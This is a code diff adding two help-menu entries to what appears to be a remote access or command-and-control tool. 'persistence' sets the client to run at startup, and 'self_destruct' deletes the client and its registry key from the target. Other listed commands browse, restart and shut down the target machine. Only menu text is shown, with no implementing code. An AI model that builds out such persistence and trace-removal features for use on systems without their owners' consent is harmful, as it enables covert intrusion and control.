@@ -103,6 +103,7 @@ def help_menu(command: str = 'help', parent: str = 'shell'):
             print(f'''
 {g.y}Command             Description{g.e}
 {g.e}-------             -----------{g.e}
+{g.g}persistence{g.e}         Add persistence to run client program at start up.
 {g.g}cwd{g.e}                 Get the current working directory.
 {g.g}ls_cwd{g.e}              List the current working directory of the client. 
 {g.g}ls_dir{g.e}              List a specific directory in the target machine.
@@ -123,6 +124,7 @@ def help_menu(command: str = 'help', parent: str = 'shell'):
 {g.g}logout{g.e}              Logout the current user.
 {g.g}restrt{g.e}              Restart the target machine.
 {g.g}shut{g.e}                Shutdown the target machine.
+{g.g}self_destruct{g.e}       Delete the client program and registry key from the target system.
 {g.g}clear{g.e}               Clear the screen.
 {g.g}exit/quit{g.e}           Exit the current active session.''')
 
